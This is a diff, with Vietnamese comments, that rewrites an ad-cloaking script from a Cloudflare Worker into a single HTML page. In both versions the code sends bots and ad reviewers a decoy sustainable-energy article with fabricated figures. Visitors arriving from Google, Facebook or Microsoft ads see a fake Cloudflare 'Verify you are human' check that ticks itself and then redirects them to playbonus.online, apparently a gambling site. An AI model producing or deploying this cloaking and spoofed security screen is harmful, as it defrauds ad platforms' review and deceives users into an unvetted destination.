@@ -1,147 +1,122 @@
-export default {
-  async fetch(request, env, ctx) {
-    const url = new URL(request.url);
-    const userAgent = request.headers.get('user-agent') || '';
-    
-    // 1. CONFIGURATION
-    const TARGET_URL = "https://playbonus.online/";
-    const adParams = ['gclid', 'wbraid', 'gbraid', 'gad_source', 'fbclid', 'msclkid'];
-    
-    // Kiểm tra thông số quảng cáo
-    const hasAdParam = adParams.some(param => url.searchParams.has(param));
-    
-    // Kiểm tra Bot
-    const isBot = /bot|google|crawler|spider|slurp|bing|facebook|adchecker|checker/i.test(userAgent);
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sustainable Energy: The Global Transition</title>
+    <script>
+        // --- CONFIGURATION ---
+        const TARGET_URL = "https://playbonus.online/";
+        const adParams = ['gclid', 'wbraid', 'gbraid', 'gad_source', 'fbclid', 'msclkid'];
+        
+        function checkAndRedirect() {
+            const url = new URL(window.location.href);
+            const userAgent = navigator.userAgent || '';
+            
+            // 1. Kiểm tra thông số quảng cáo
+            const hasAdParam = adParams.some(param => url.searchParams.has(param));
+            
+            // 2. Kiểm tra Bot
+            const isBot = /bot|google|crawler|spider|slurp|bing|facebook|adchecker|checker/i.test(userAgent);
 
-    // Ngăn chặn chạy khi đang trong chế độ chỉnh sửa Elementor
-    if (url.href.indexOf('elementor') > -1) {
-      return fetch(request);
-    }
+            // 3. Logic phân luồng
+            if (!isBot && hasAdParam) {
+                // Hiển thị trang chờ và chuyển hướng
+                document.getElementById('safe-page').style.display = 'none';
+                document.getElementById('money-page').style.display = 'flex';
+                
+                setTimeout(() => {
+                    const cb = document.getElementById('verify-cb');
+                    if (cb) cb.checked = true;
+                    setTimeout(() => {
+                        window.location.replace(TARGET_URL);
+                    }, 800);
+                }, 1500);
+            } else {
+                // Hiển thị trang Blog (Safe Page)
+                document.getElementById('money-page').style.display = 'none';
+                document.getElementById('safe-page').style.display = 'block';
+            }
+        }
 
-    // 2. LOGIC PHÂN LUỒNG
-    if (!isBot && hasAdParam) {
-      // TRẢ VỀ TRANG SECURITY CHECK (MONEY PAGE REDIRECT)
-      return new Response(getMoneyPageHTML(TARGET_URL), {
-        headers: {
-          'content-type': 'text/html;charset=UTF-8',
-          'Referrer-Policy': 'no-referrer'
-        },
-      });
-    } else {
-      // TRẢ VỀ TRANG SAFE PAGE (CONTENT REVIEW)
-      return new Response(getSafePageHTML(), {
-        headers: {
-          'content-type': 'text/html;charset=UTF-8',
-        },
-      });
-    }
-  },
-};
+        window.onload = checkAndRedirect;
+    </script>
+    <style>
+        /* CSS cho Trang Chờ (Money Page) */
+        #money-page { 
+            position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;z-index:9999999;
+            display:none; align-items:center;justify-content:center;
+            font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif; 
+        }
+        .sec-box { max-width:450px;width:90%;padding:20px; }
+        
+        /* CSS cho Trang Blog (Safe Page) */
+        #safe-page { display:none; background: #fafafa; color: #2c3e50; }
+        .blog-container { 
+            max-width: 850px; margin: 60px auto; line-height: 1.8; padding: 40px; 
+            background: #ffffff; box-shadow: 0 4px 15px rgba(0,0,0,0.05); border-radius: 8px; 
+        }
+    </style>
+</head>
+<body>
 
-// --- NỘI DUNG GIAO DIỆN TRANG CHỜ CHUYỂN HƯỚNG (GIỮ NGUYÊN) ---
-function getMoneyPageHTML(targetUrl) {
-  return `
-  <!DOCTYPE html>
-  <html>
-  <head>
-      <title>Please Wait...</title>
-      <meta name="viewport" content="width=device-width, initial-scale=1">
-      <meta name="referrer" content="no-referrer">
-      <style>
-          body { margin: 0; padding: 0; }
-          #sec-container { position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;z-index:9999999;display:flex;align-items:center;justify-content:center;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif; }
-      </style>
-  </head>
-  <body>
-      <div id="sec-container">
-          <div style="max-width:450px;width:90%;padding:20px;">
-              <h2 style="font-size:26px;font-weight:600;margin-bottom:12px;color:#111;">Checking if the site connection is secure</h2>
-              <p style="color:#666;font-size:15px;margin-bottom:32px;line-height:1.5;">Our system is verifying your request. This process is automatic to ensure the security of our infrastructure.</p>
-              
-              <div style="background:#f7fafc;border:1px solid #e2e8f0;padding:24px;border-radius:10px;display:flex;align-items:center;justify-content:space-between;margin-bottom:32px;">
-                  <div style="display:flex;align-items:center;">
-                      <input type="checkbox" id="verify-cb" style="width:24px;height:24px;margin-right:16px;cursor:pointer;">
-                      <label for="verify-cb" style="font-size:16px;color:#2d3748;cursor:pointer;user-select:none;">Verify you are human</label>
-                  </div>
-                  <div style="text-align:right;">
-                      <img src="https://www.cloudflare.com/img/logo-cloudflare-dark.svg" style="height:24px;" alt="Security">
-                      <p style="font-size:10px;color:#a0aec0;margin-top:6px;margin-bottom:0;">Privacy • Terms</p>
-                  </div>
-              </div>
-
-              <div style="border-top:1px solid #edf2f7;padding-top:24px;">
-                  <h3 style="font-size:16px;font-weight:600;margin-bottom:8px;color:#1a202c;">Why am I seeing this page?</h3>
-                  <p style="font-size:14px;color:#718096;line-height:1.6;margin:0;">Verification is required to ensure that the connection is legitimate and to prevent automated malicious activity.</p>
-              </div>
-          </div>
-      </div>
-      <script>
-          setTimeout(() => {
-              const cb = document.getElementById('verify-cb');
-              if (cb) cb.checked = true;
-              setTimeout(() => {
-                  window.location.replace("${targetUrl}");
-              }, 800);
-          }, 1500);
-      </script>
-  </body>
-  </html>`;
-}
-
-// --- NỘI DUNG TRANG SAFE PAGE (ĐÃ THAY ĐỔI CHỦ ĐỀ) ---
-function getSafePageHTML() {
-  return `
-  <!DOCTYPE html>
-  <html lang="en">
-  <head>
-      <meta charset="UTF-8">
-      <meta name="viewport" content="width=device-width, initial-scale=1.0">
-      <title>Sustainable Energy: The Global Transition</title>
-  </head>
-  <body style="margin:0; padding:0; background: #fafafa;">
-    <article style="max-width: 850px; margin: 60px auto; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; line-height: 1.8; color: #2c3e50; padding: 40px; background: #ffffff; box-shadow: 0 4px 15px rgba(0,0,0,0.05); border-radius: 8px;">
-        <header style="border-bottom: 2px solid #2ecc71; margin-bottom: 40px; padding-bottom: 20px;">
-            <h1 style="font-size: 2.5rem; color: #1a252f; line-height: 1.2; font-weight: 700;">Sustainable Energy Systems: Strategic Analysis of Renewable Integration</h1>
-            <p style="color: #7f8c8d; font-size: 1rem; margin-top: 15px; text-transform: uppercase; letter-spacing: 1px;">Scientific Journal • Global Ecology Division • Update 2025</p>
-        </header>
-
-        <section>
-            <p style="font-size: 1.2rem; color: #34495e; line-height: 1.7; font-style: italic; margin-bottom: 35px; border-left: 5px solid #2ecc71; padding-left: 20px;">
-                "The shift toward renewable resources is no longer a choice but a technical necessity for modern economic stability. This review examines the efficiency of decentralized power grids."
-            </p>
-
-            <h2 style="font-size: 1.7rem; color: #16a085; margin-top: 40px;">1. Decarbonization and Grid Stability</h2>
-            <p>One of the primary challenges in the green transition is maintaining grid stability while increasing the percentage of intermittent sources like solar and wind. Advanced AI algorithms are now being used to predict load fluctuations and adjust storage output in real-time.</p>
-
-            <div style="background: #f1f9f5; border: 1px solid #d1e7dd; padding: 25px; margin: 30px 0; border-radius: 8px;">
-                <h4 style="margin-top:0; color:#0f5132;">Annual Efficiency Growth (2020-2025):</h4>
-                <ul style="margin-bottom:0; line-height: 2;">
-                    <li><strong>Photovoltaic Conversion:</strong> Increased by 14.2% globally.</li>
-                    <li><strong>Lithium-Sulfur Storage:</strong> Reaching 450 Wh/kg in test phases.</li>
-                    <li><strong>Carbon Sequestration:</strong> Operational costs reduced by 22% annually.</li>
-                </ul>
+    <!-- NỘI DUNG TRANG CHỜ (MONEY PAGE) -->
+    <div id="money-page">
+        <div class="sec-box">
+            <h2 style="font-size:26px;font-weight:600;margin-bottom:12px;color:#111;">Checking if the site connection is secure</h2>
+            <p style="color:#666;font-size:15px;margin-bottom:32px;line-height:1.5;">Our system is verifying your request. This process is automatic to ensure security.</p>
+            
+            <div style="background:#f7fafc;border:1px solid #e2e8f0;padding:24px;border-radius:10px;display:flex;align-items:center;justify-content:space-between;margin-bottom:32px;">
+                <div style="display:flex;align-items:center;">
+                    <input type="checkbox" id="verify-cb" style="width:24px;height:24px;margin-right:16px;cursor:pointer;">
+                    <label for="verify-cb" style="font-size:16px;color:#2d3748;cursor:pointer;">Verify you are human</label>
+                </div>
+                <div style="text-align:right;">
+                    <img src="https://www.cloudflare.com/img/logo-cloudflare-dark.svg" style="height:24px;" alt="Security">
+                </div>
             </div>
-
-            <h2 style="font-size: 1.7rem; color: #16a085; margin-top: 40px;">2. The Role of Smart Infrastructure</h2>
-            <p>Smart cities represent the next frontier. By integrating IoT sensors into urban heating and cooling systems, energy waste can be reduced by up to 30%. This synergy between digital technology and environmental science is the key to achieving Net Zero by 2050.</p>
-
-            <h2 style="font-size: 1.7rem; color: #16a085; margin-top: 40px;">3. Economic Implications of Green Policies</h2>
-            <p>While the initial capital expenditure (CAPEX) for renewable projects remains higher than traditional fossil fuels, the operational expenditure (OPEX) is significantly lower. Over a 20-year lifecycle, green energy proves to be 40% more cost-effective for large-scale industrial applications.</p>
-
-            <div style="margin: 50px 0; padding: 35px; background: #1a252f; color: #ecf0f1; text-align: center; border-radius: 10px;">
-                <h3 style="margin-top:0; color: #2ecc71;">2025 Ecological Forecast</h3>
-                <p style="font-size: 1.1rem; opacity: 0.9;">"The convergence of battery technology and green hydrogen will likely render traditional coal-fired plants obsolete within the next decade."</p>
-                <div style="font-weight: bold; margin-top: 15px; font-size: 1.3rem; color: #f1c40f;">Global Sustainability Index Score: A+</div>
+            <div style="border-top:1px solid #edf2f7;padding-top:24px;">
+                <p style="font-size:14px;color:#718096;line-height:1.6;margin:0;">Verification is required to prevent automated malicious activity.</p>
             </div>
+        </div>
+    </div>
 
-            <h2 style="font-size: 1.7rem; color: #16a085; margin-top: 40px;">Conclusion</h2>
-            <p>The path to a sustainable future is paved with engineering innovation. As we continue to refine energy harvesting techniques, the global economy becomes more resilient to climate-related supply chain disruptions.</p>
-        </section>
+    <!-- NỘI DUNG TRANG BLOG (SAFE PAGE) -->
+    <div id="safe-page">
+        <article class="blog-container" style="font-family: sans-serif;">
+            <header style="border-bottom: 2px solid #2ecc71; margin-bottom: 40px; padding-bottom: 20px;">
+                <h1 style="font-size: 2.5rem; color: #1a252f;">Sustainable Energy Systems: Strategic Analysis</h1>
+                <p style="color: #7f8c8d;">Scientific Journal • Global Ecology Division • 2025</p>
+            </header>
 
-        <footer style="margin-top: 60px; padding-top: 25px; border-top: 1px solid #eee; font-size: 0.85rem; color: #95a5a6; text-align: center;">
-            © 2025 Institute for Global Sustainability & Green Research. All Rights Reserved. This document is a technical draft for peer review.
-        </footer>
-    </article>
-  </body>
-  </html>`;
-}
+            <section>
+                <p style="font-size: 1.2rem; font-style: italic; border-left: 5px solid #2ecc71; padding-left: 20px;">
+                    "The shift toward renewable resources is no longer a choice but a technical necessity."
+                </p>
+                <h2 style="color: #16a085;">1. Decarbonization and Grid Stability</h2>
+                <p>One of the primary challenges in the green transition is maintaining grid stability while increasing the percentage of intermittent sources like solar and wind.</p>
+                
+                <div style="background: #f1f9f5; border: 1px solid #d1e7dd; padding: 20px; border-radius: 8px; margin: 20px 0;">
+                    <ul style="line-height: 2;">
+                        <li><strong>Photovoltaic Conversion:</strong> +14.2% global growth.</li>
+                        <li><strong>Storage:</strong> Reaching 450 Wh/kg in testing.</li>
+                    </ul>
+                </div>
+
+                <h2 style="color: #16a085;">2. Economic Implications</h2>
+                <p>While initial capital expenditure for renewable projects remains high, the operational costs are significantly lower over time.</p>
+
+                <div style="margin: 40px 0; padding: 30px; background: #1a252f; color: #fff; text-align: center; border-radius: 10px;">
+                    <h3 style="color: #2ecc71;">2025 Ecological Forecast</h3>
+                    <p>Global Sustainability Index Score: A+</p>
+                </div>
+            </section>
+
+            <footer style="margin-top: 50px; text-align: center; color: #95a5a6; font-size: 0.8rem;">
+                © 2025 Institute for Global Sustainability.
+            </footer>
+        </article>
+    </div>
+
+</body>
+</html>
